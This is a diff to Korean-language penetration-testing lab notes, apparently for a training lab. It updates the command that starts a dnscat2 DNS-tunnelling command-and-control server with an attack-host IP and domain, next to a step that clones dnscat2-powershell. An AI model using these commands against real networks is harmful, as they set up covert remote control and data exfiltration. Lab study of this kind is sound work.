@@ -239,7 +239,7 @@ sudo bundle install
 ```
 
 ### dnscat2 서버 시작
-```ruby dnscat2.rb --dns```
+```ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache```
 
 ### 공격 호스트에 dnscat2-powershell 복제
 ```git clone https://github.com/lukebaggett/dnscat2-powershell.git```
